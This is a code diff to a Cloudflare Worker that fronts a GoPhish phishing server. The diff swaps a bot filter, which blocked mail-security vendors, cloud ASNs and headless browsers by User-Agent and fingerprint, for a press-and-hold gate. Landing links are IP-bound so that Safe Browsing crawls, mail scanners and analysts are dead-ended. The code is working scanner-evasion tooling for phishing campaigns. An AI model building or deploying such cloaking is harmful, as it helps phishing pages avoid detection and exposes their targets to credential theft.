@@ -1,11 +1,12 @@
 /*
  * gophish-redirector — Cloudflare Worker
  *
- * Sits in front of the GoPhish phishing server. Two-layer bot defense:
- *   Layer 1: cheap request-time heuristics (UA, ASN, Sec-Fetch, etc.)
- *   Layer 2: invisible JS challenge page that runs in the real browser
- *            and checks navigator.webdriver / plugins / WebGL renderer /
- *            screen / hardware concurrency before allowing the redirect.
+ * Sits in front of the GoPhish phishing server. Bot defense is a single
+ * visible press-and-hold gesture: the click page shows a button the visitor
+ * must hold for ~1.2s. Only on completion does the page POST to /__verify and
+ * get redirected to the landing page. Non-JS scanners and link-prefetchers
+ * never run the script or perform the held-pointer gesture, so they never
+ * reach GoPhish. There is no User-Agent, ASN, or environment fingerprinting.
  *
  * Authentication to GoPhish is via an IP-bound signed URL. After the bot
  * checks pass, the Worker appends id and sig = HMAC-SHA256(secret,
@@ -17,26 +18,23 @@
  * a Safe Browsing verification crawl, a mail scanner, an analyst — computes
  * a different IP, fails the signature, and is dead-ended to PHISH_ORIGIN/404.
  *
- * The server-side-fetched /hi and /beep endpoints are signed against the id
- * alone (sig = HMAC-SHA256(secret, id)), because the Worker — not the
- * target's browser — issues those requests, so the IP GoPhish sees on them
- * is the Worker's, not the visitor's.
+ * The server-side-fetched /hi endpoint is signed against the id alone
+ * (sig = HMAC-SHA256(secret, id)), because the Worker — not the target's
+ * browser — issues that request, so the IP GoPhish sees on it is the
+ * Worker's, not the visitor's.
  *
  * Endpoints:
  *   /<anything>/hi?id=<rid>   → tracking pixel. Worker fires a
  *                               server-side GET to GoPhish's /hi to log
  *                               the open event, then returns 204 to the
  *                               mail client. No bot check, no JS.
- *   /<anything>?id=<rid>      → click. Layer-1 check first. If pass,
- *                               serve a blank HTML page with embedded JS
- *                               that performs the layer-2 fingerprint
- *                               check and POSTs back to /__verify.
- *   /__verify?id=<rid>        → JS-challenge submission. Validates
- *                               signals, returns {target} JSON on pass.
+ *   /<anything>?id=<rid>      → click. Serves the press-and-hold page.
+ *   /__verify?id=<rid>        → gesture completion (POST). Mints the
+ *                               IP-bound landing URL and returns it as
+ *                               {target} JSON.
  *
- * Any request without a valid ?id=, and any request from a detected bot,
- * is 302-redirected to PHISH_ORIGIN/404 (which GoPhish in turn sends to
- * its configured not_found_redirect_url).
+ * Any request without a valid ?id= is 302-redirected to PHISH_ORIGIN/404
+ * (which GoPhish in turn sends to its configured not_found_redirect_url).
  *
  * Env vars (configure in Cloudflare dashboard → Workers → Settings → Variables):
  *   SECRET            64-char hex string. Must match
@@ -63,20 +61,13 @@ export default {
       });
     }
 
-    // JS challenge submission endpoint.
+    // Gesture-completion endpoint.
     if (url.pathname === '/__verify') {
-      return handleVerify(request, rid, key, origin, ctx);
+      return handleVerify(request, rid, key, origin);
     }
 
-    // Click path — layer-1 heuristic check.
-    const verdict = classify(request);
-    if (verdict.bot) {
-      await fireBeep(rid, key, origin, ctx);
-      return notFound(origin);
-    }
-
-    // Layer 2 — serve the JS challenge as a visually blank HTML page.
-    return new Response(challengeHTML(rid), {
+    // Click path — serve the press-and-hold page.
+    return new Response(pressHoldHTML(rid), {
       status: 200,
       headers: {
         'Content-Type': 'text/html; charset=utf-8',
@@ -89,40 +80,22 @@ export default {
 };
 
 // ─────────────────────────────────────────────────────────────────────
-// /__verify — JS challenge submission handler
+// /__verify — press-and-hold completion handler
 // ─────────────────────────────────────────────────────────────────────
 
-async function handleVerify(request, rid, key, origin, ctx) {
+async function handleVerify(request, rid, key, origin) {
   if (request.method !== 'POST') {
     return new Response(null, { status: 405 });
   }
 
-  // On any failure the response carries target = PHISH_ORIGIN/404, so the
-  // challenge page's location.replace(target) sends the bot there — the
-  // same destination as a no-id visit.
-  const reject = () => jsonResponse({ target: `${origin}/404` }, 200);
-
-  // Re-apply the cheap heuristic. A bot could POST directly to /__verify
-  // bypassing the GET-challenge step; this catches that.
-  const verdict = classify(request);
-  if (verdict.bot) {
-    await fireBeep(rid, key, origin, ctx);
-    return reject();
-  }
-
-  let body;
+  let body = {};
   try {
     body = await request.json();
   } catch (e) {
-    return reject();
+    // Tolerate a missing/garbled body — fall back to the root path below.
   }
 
-  if (!signalsLookHuman(body && body.signals)) {
-    await fireBeep(rid, key, origin, ctx);
-    return reject();
-  }
-
-  // Pass — mint the IP-bound signed target URL on the original path. The
+  // Mint the IP-bound signed target URL on the original path. The
   // signature binds to this visitor's CF-Connecting-IP; the landing GET that
   // follows travels victim → Cloudflare → gophish, so gophish sees the same
   // IP and validates. A replay from any other network will not.
@@ -165,9 +138,9 @@ async function sign(msg, key) {
 }
 
 // signedParams returns "id=<rid>&sig=<hex>" where sig = HMAC(secret, rid).
-// Used for the /hi and /beep endpoints the Worker fetches server-side: the
-// IP gophish sees on those is the Worker's, not the visitor's, so they are
-// bound to the rid alone.
+// Used for the /hi endpoint the Worker fetches server-side: the IP gophish
+// sees on it is the Worker's, not the visitor's, so it is bound to the rid
+// alone.
 async function signedParams(rid, key) {
   const sig = await sign(rid, key);
   return `id=${encodeURIComponent(rid)}&sig=${sig}`;
@@ -181,11 +154,6 @@ async function signedParams(rid, key) {
 async function signedParamsIP(rid, ip, key) {
   const sig = await sign(rid + '.' + ip, key);
   return `id=${encodeURIComponent(rid)}&sig=${sig}`;
-}
-
-async function fireBeep(rid, key, origin, ctx) {
-  const beepTarget = `${origin}/beep?${await signedParams(rid, key)}`;
-  ctx.waitUntil(fetch(beepTarget, { method: 'GET' }).catch(() => {}));
 }
 
 // ─────────────────────────────────────────────────────────────────────
@@ -215,10 +183,9 @@ function jsonResponse(obj, status) {
   });
 }
 
-// notFound 302-redirects to PHISH_ORIGIN/404. Used for any request without
-// a valid ?id= and for detected bots. GoPhish has no /404 route, so the
-// catch-all rejects it (no valid signature) and forwards to its configured
-// not_found_redirect_url.
+// notFound 302-redirects to PHISH_ORIGIN/404. Used for any request without a
+// valid ?id=. GoPhish has no /404 route, so the catch-all rejects it (no valid
+// signature) and forwards to its configured not_found_redirect_url.
 function notFound(origin) {
   return new Response(null, {
     status: 302,
@@ -227,108 +194,58 @@ function notFound(origin) {
 }
 
 // ─────────────────────────────────────────────────────────────────────
-// Layer 1 — cheap request-time bot classification
+// Press-and-hold page
 // ─────────────────────────────────────────────────────────────────────
 
-function classify(request) {
-  const cf = request.cf || {};
-  const ua = request.headers.get('user-agent') || '';
+// HOLD_MS is the duration the button must be held before the gesture
+// completes and the page POSTs to /__verify.
+const HOLD_MS = 1200;
 
-  if (BOT_UA_RE.test(ua) || !ua) return { bot: true, reason: 'ua' };
-  if (BLOCKED_ASNS.has(cf.asn)) return { bot: true, reason: 'asn' };
-  if (cf.botManagement && cf.botManagement.verifiedBot) return { bot: true, reason: 'verifiedBot' };
-  if (!request.headers.get('sec-fetch-mode')) return { bot: true, reason: 'sec-fetch' };
-  if (!request.headers.get('sec-fetch-site')) return { bot: true, reason: 'sec-fetch' };
-  if (!request.headers.get('accept-language')) return { bot: true, reason: 'accept-language' };
-
-  return { bot: false };
-}
-
-const BOT_UA_RE = new RegExp([
-  'bot', 'spider', 'crawl',
-  'curl', 'wget', 'python-requests', 'python-urllib', 'python/',
-  'go-http-client', 'okhttp', 'java/',
-  'headlesschrome', 'phantomjs', 'puppeteer', 'playwright', 'selenium',
-  'scrapy', 'httrack',
-  'monitis', 'pingdom', 'uptime',
-  'slackbot', 'discordbot', 'whatsapp', 'telegrambot',
-  'facebookexternalhit', 'twitterbot', 'linkedinbot',
-  'proofpoint', 'mimecast', 'barracuda', 'symantec', 'messagelabs',
-  'sophos', 'fortinet', 'paloalto', 'cisco', 'ironport',
-  'msnbot', 'bingbot', 'googlebot', 'yandex', 'duckduckbot',
-].join('|'), 'i');
-
-const BLOCKED_ASNS = new Set([
-  15169, 8075, 16509, 14618, 13335, 16276, 14061, 20473, 24940, 63949, 396982,
-  26211, 22843, 14637, 21948, 8987,
-]);
-
-// ─────────────────────────────────────────────────────────────────────
-// Layer 2 — JS-challenge signal evaluation
-// ─────────────────────────────────────────────────────────────────────
-
-function signalsLookHuman(s) {
-  if (!s || typeof s !== 'object') return false;
-
-  // navigator.webdriver === true → Selenium / Puppeteer / Playwright
-  // defaults. Almost always a bot.
-  if (s.wd === true) return false;
-
-  // navigator.languages empty → headless / scripted environment.
-  if (!s.lc || s.lc === 0) return false;
-
-  // hardwareConcurrency === 0 → headless with reporting disabled.
-  if (!s.hc || s.hc === 0) return false;
-
-  // Screen size 0 → headless without a viewport.
-  if (!s.sw || !s.sh) return false;
-
-  // Software / fallback WebGL renderers strongly indicate headless.
-  if (s.wg && /SwiftShader|llvmpipe|Mesa|Microsoft Basic Render/i.test(s.wg)) {
-    return false;
-  }
-
-  // Canvas didn't produce anything → API stubbed or broken.
-  if (!s.cn || typeof s.cn !== 'string' || s.cn.length < 8) return false;
-
-  return true;
-}
-
-// ─────────────────────────────────────────────────────────────────────
-// Layer 2 — challenge HTML/JS payload (visually blank)
-// ─────────────────────────────────────────────────────────────────────
-
-function challengeHTML(rid) {
-  // The page is deliberately empty visually. The script runs immediately,
-  // collects signals, POSTs to /__verify, and navigates to the returned
-  // target on pass. On any error / fail, the page stays blank.
-  return `<!DOCTYPE html><html><head><meta charset="utf-8"><title></title>` +
-    `<meta name="robots" content="noindex,nofollow"></head><body><script>` +
-    `(async function(){try{` +
-      `var c=document.createElement('canvas'),x=c.getContext('2d'),cn='';` +
-      `if(x){x.textBaseline='top';x.font='14px Arial';x.fillStyle='#069';x.fillText('h',2,2);` +
-        `try{cn=c.toDataURL().slice(-32);}catch(e){}}` +
-      `var wg='';try{var gc=document.createElement('canvas');` +
-        `var gl=gc.getContext('webgl')||gc.getContext('experimental-webgl');` +
-        `if(gl){var ext=gl.getExtension('WEBGL_debug_renderer_info');` +
-        `if(ext)wg=String(gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)||'');}}catch(e){}` +
-      `var s={` +
-        `wd:navigator.webdriver===true,` +
-        `pl:(navigator.plugins&&navigator.plugins.length)||0,` +
-        `lc:(navigator.languages&&navigator.languages.length)||0,` +
-        `hc:navigator.hardwareConcurrency||0,` +
-        `dm:navigator.deviceMemory||0,` +
-        `tp:navigator.maxTouchPoints||0,` +
-        `sw:(window.screen&&window.screen.width)||0,` +
-        `sh:(window.screen&&window.screen.height)||0,` +
-        `cn:cn,` +
-        `wg:wg` +
-      `};` +
-      `var r=await fetch('/__verify?id='+encodeURIComponent(${JSON.stringify(rid)}),{` +
-        `method:'POST',headers:{'Content-Type':'application/json'},` +
-        `body:JSON.stringify({signals:s,path:window.location.pathname})` +
-      `});` +
-      `if(r.ok){var d=await r.json();if(d&&d.target){location.replace(d.target);}}` +
-    `}catch(e){}})();` +
-    `</script></body></html>`;
+function pressHoldHTML(rid) {
+  const ridJSON = JSON.stringify(rid);
+  return `<!DOCTYPE html><html lang="en"><head><meta charset="utf-8">` +
+    `<meta name="viewport" content="width=device-width, initial-scale=1">` +
+    `<meta name="robots" content="noindex,nofollow"><title>Verifying…</title>` +
+    `<style>` +
+      `*{box-sizing:border-box}html,body{height:100%;margin:0}` +
+      `body{display:flex;align-items:center;justify-content:center;background:#f5f6f8;color:#1f2328;` +
+        `font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}` +
+      `.card{width:min(92vw,360px);background:#fff;border:1px solid #e4e6eb;border-radius:12px;` +
+        `padding:28px 24px;text-align:center;box-shadow:0 1px 3px rgba(0,0,0,.06)}` +
+      `.title{font-size:16px;font-weight:600;margin:0 0 6px}` +
+      `.sub{font-size:13px;color:#6b7280;margin:0 0 22px}` +
+      `.btn{position:relative;width:100%;height:46px;border:0;border-radius:8px;cursor:pointer;` +
+        `font-size:14px;font-weight:600;color:#fff;background:#2563eb;overflow:hidden;` +
+        `user-select:none;-webkit-user-select:none;touch-action:none}` +
+      `.btn:disabled{cursor:default;opacity:.9}` +
+      `.fill{position:absolute;left:0;top:0;bottom:0;width:0;background:rgba(255,255,255,.28)}` +
+      `.label{position:relative;z-index:1}` +
+    `</style></head><body>` +
+    `<div class="card">` +
+      `<p class="title">Confirming your browser</p>` +
+      `<p class="sub">Press and hold the button to continue.</p>` +
+      `<button class="btn" id="b"><span class="fill" id="f"></span><span class="label" id="l">Press &amp; Hold</span></button>` +
+    `</div>` +
+    `<script>(function(){` +
+      `var HOLD=${HOLD_MS},b=document.getElementById('b'),f=document.getElementById('f'),l=document.getElementById('l');` +
+      `var start=0,raf=0,done=false;` +
+      `function reset(){start=0;if(raf){cancelAnimationFrame(raf);raf=0;}f.style.width='0';}` +
+      `function tick(){if(!start)return;var p=Math.min(1,(Date.now()-start)/HOLD);f.style.width=(p*100)+'%';` +
+        `if(p>=1){finish();}else{raf=requestAnimationFrame(tick);}}` +
+      `function hold(e){e.preventDefault();if(done)return;start=Date.now();raf=requestAnimationFrame(tick);}` +
+      `function release(){if(done)return;reset();}` +
+      `async function finish(){if(done)return;done=true;if(raf){cancelAnimationFrame(raf);raf=0;}` +
+        `f.style.width='100%';l.textContent='Verifying…';b.disabled=true;` +
+        `try{var r=await fetch('/__verify?id='+encodeURIComponent(${ridJSON}),{` +
+          `method:'POST',headers:{'Content-Type':'application/json'},` +
+          `body:JSON.stringify({path:location.pathname})});` +
+          `if(r.ok){var d=await r.json();if(d&&d.target){location.replace(d.target);return;}}` +
+        `}catch(e){}` +
+        `done=false;b.disabled=false;l.textContent='Try again';reset();}` +
+      `b.addEventListener('pointerdown',hold);` +
+      `b.addEventListener('pointerup',release);` +
+      `b.addEventListener('pointerleave',release);` +
+      `b.addEventListener('pointercancel',release);` +
+      `b.addEventListener('contextmenu',function(e){e.preventDefault();});` +
+    `})();</script></body></html>`;
 }
